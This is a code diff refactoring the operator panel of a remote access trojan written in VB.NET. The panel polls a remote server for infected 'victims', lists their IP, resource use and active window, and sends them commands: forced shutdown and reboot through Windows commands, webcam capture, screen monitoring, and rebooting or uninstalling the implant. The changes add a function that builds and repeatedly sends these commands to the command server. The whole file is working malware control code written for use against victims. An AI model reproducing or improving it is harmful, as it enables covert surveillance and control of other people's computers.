@@ -35,17 +35,10 @@ Public Class RatPanel
             Try
                 clientInfoList = Split(New WebClient().DownloadString(My.Settings.vpsurl & "clients.php?action=cleanit"), "[;;]")
             Catch ex As WebException
-                Dim errMessage = MsgBox("Unable to connect to the FTP server." & vbCrLf &
-                       "FTP: " & My.Settings.vpsurl & vbCrLf & vbCrLf &
-                       "Do you want to modify it ?", MsgBoxStyle.YesNo)
-
-                If errMessage = MsgBoxResult.Yes Then
-                    My.Settings.Reset()
-                    ServerCheck.Show()
-                    Exit While
-                Else
-                    End
-                End If
+                ServerCheck.DisplayServerError(ex)
+                Dim serverCheckForm As Form = ServerCheck
+                Invoke(Sub() serverCheckForm.Show())
+                Exit While
             End Try
 
             Invoke(Sub() connectedClientsView.Rows.Clear())
@@ -60,16 +53,18 @@ Public Class RatPanel
                     Try
                         Dim jsonParse = Linq.JObject.Parse(currentClientData)
 
-                        Dim ip As String = jsonParse.Item("ip")
-                        Dim ping As String = jsonParse.Item("ping")
-                        Dim cpu As String = jsonParse.Item("cpu")
-                        Dim ram As String = jsonParse.Item("ram")
-                        Dim softwareName As String = jsonParse.Item("softwarename")
-                        Dim upTime As String = jsonParse.Item("uptime")
+                        Dim ip = jsonParse.Item("ip").ToString()
+                        Dim ping = jsonParse.Item("ping").ToString()
+                        Dim cpu = jsonParse.Item("cpu").ToString()
+                        Dim ram = jsonParse.Item("ram").ToString()
+                        Dim softwareName = jsonParse.Item("softwarename").ToString()
+                        Dim upTime = jsonParse.Item("uptime").ToString()
+
+                        Dim upTimeFormatted As String = ""
 
                         If upTime.Trim <> "" Then
                             Dim iSpan As TimeSpan = TimeSpan.FromSeconds(upTime)
-                            upTime = iSpan.Hours.ToString.PadLeft(2, "0"c) + ":" +
+                            upTimeFormatted = iSpan.Hours.ToString.PadLeft(2, "0"c) + ":" +
                                 iSpan.Minutes.ToString.PadLeft(2, "0"c) & ":" +
                                 iSpan.Seconds.ToString.PadLeft(2, "0"c)
                         End If
@@ -77,9 +72,8 @@ Public Class RatPanel
                         Dim currentWindow =
                             Encoding.UTF8.GetString(Convert.FromBase64String(jsonParse.Item("currentwindow").ToString()))
 
-                        ' TODO: Problem receiving CPU and RAM usage
                         If ip.Trim.Length > 0 Then
-                            Invoke(Sub() connectedClientsView.Rows.Add(ip, cpu & "%", ram, ping & "ms", currentWindow, upTime, softwareName))
+                            Invoke(Sub() connectedClientsView.Rows.Add(ip, cpu & "%", ram, ping & "ms", currentWindow, upTimeFormatted, softwareName))
                         End If
                     Catch ex As JsonReaderException
                         MsgBox("Unable to serialize victims data from API" & ControlChars.Lf & "FTP: " & My.Settings.vpsurl, MsgBoxStyle.Exclamation)
@@ -89,7 +83,7 @@ Public Class RatPanel
                     clientsCount += 1
                 Next
 
-                Invoke(Sub() clientListLBL.Text = "Clients : " & clientsCount)
+                clientListLBL.Text = "Clients : " & clientsCount
             End If
 
             Threading.Thread.Sleep(4500)
@@ -104,34 +98,48 @@ Public Class RatPanel
     End Sub
 
     ''' <summary>
-    ''' A simplified version of the `DirectPanelCommand` function, which automatically grabs the target IP.
+    ''' This function automatically grabs the target IP,
+    ''' then asks for safety and finally proceed to a direct command query on the HTTP server
     ''' </summary>
-    Private Function SimpleDirectAPICommand(message As String, actionType As String, actionContent As String()) As Boolean
-        Return Utils.DirectPanelCommand(connectedClientsView.CurrentCell.Value.ToString, mainWebClient, message, actionType, actionContent)
-    End Function
+    Private Sub RunDirectPanelCommand(message As String,
+                                      actionType As String,
+                                      actionContent As String())
+
+        Dim targetIp As String = connectedClientsView.CurrentCell.Value.ToString
+        Dim actionContentParsed As String = ""
+        Dim contentNum As Integer = 1
+
+        For Each _data In actionContent
+            If _data.Contains(" ") Then _data = """" & _data & """"
+            If contentNum = 1 Then
+                actionContentParsed &= "&actioncontent=" & _data
+            Else
+                actionContentParsed &= "&actioncontent" & contentNum & "=" & _data
+            End If
+            contentNum += 1
+        Next
+
+        If MsgBox(message, MsgBoxStyle.YesNo) = MsgBoxResult.Yes Then
+            For i = 0 To 5 ' Spam request to stub
+                mainWebClient.DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=" & actionType & actionContentParsed)
+                System.Threading.Thread.Sleep(50)
+            Next
+        End If
+    End Sub
 
     Private Sub ShutdownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShutdownToolStripMenuItem.Click
-        SimpleDirectAPICommand("Are you sure you want to shutdown this victim's computer ?", "runwincmd",
+        RunDirectPanelCommand("Are you sure you want to shutdown this victim's computer ?", "runwincmd",
                               {"shutdown /s /f /t 0"})
     End Sub
 
     Private Sub RebootToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RebootToolStripMenuItem.Click
-        SimpleDirectAPICommand("Are you sure you want to reboot this victim's computer ?", "runwincmd",
+        RunDirectPanelCommand("Are you sure you want to reboot this victim's computer ?", "runwincmd",
                               {"shutdown /r /f /t 0"})
     End Sub
 
     Private Sub RATShutdownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RATShutdownToolStripMenuItem.Click
-        SimpleDirectAPICommand("Are you sure you want to shutdown the RAT on this victim's computer ?", "shutdownrat", {})
+        RunDirectPanelCommand("Are you sure you want to shutdown the RAT on this victim's computer ?", "shutdownrat", {})
     End Sub
-
-    Private Sub RATRebootToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RATRebootToolStripMenuItem.Click
-        SimpleDirectAPICommand("Are you sure you want to reboot the RAT on this victim's computer ?", "rebootrat", {})
-    End Sub
-
-    Private Sub RATUninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RATUninstallToolStripMenuItem.Click
-        SimpleDirectAPICommand("Are you sure you want to reboot the RAT on this victim's computer ?", "uninstallrat", {})
-    End Sub
-
 
     Private Sub ScreenMonitorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ScreenMonitorToolStripMenuItem.Click
         Dim form As New ScreenMonitor()
@@ -159,6 +167,15 @@ Public Class RatPanel
         MsgBox(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=camerashot")
         mainWebClient.DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=camerashot")
     End Sub
+
+    Private Sub RATRebootToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RATRebootToolStripMenuItem.Click
+        RunDirectPanelCommand("Are you sure you want to reboot the RAT on this victim's computer ?", "rebootrat", {})
+    End Sub
+
+    Private Sub RATUninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RATUninstallToolStripMenuItem.Click
+        RunDirectPanelCommand("Are you sure you want to reboot the RAT on this victim's computer ?", "uninstallrat", {})
+    End Sub
+
     Private Sub UserBlacklistToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UserBlacklistToolStripMenuItem.Click
         Dim form As New Blacklist
         form.targetIp = connectedClientsView.CurrentCell.Value.ToString
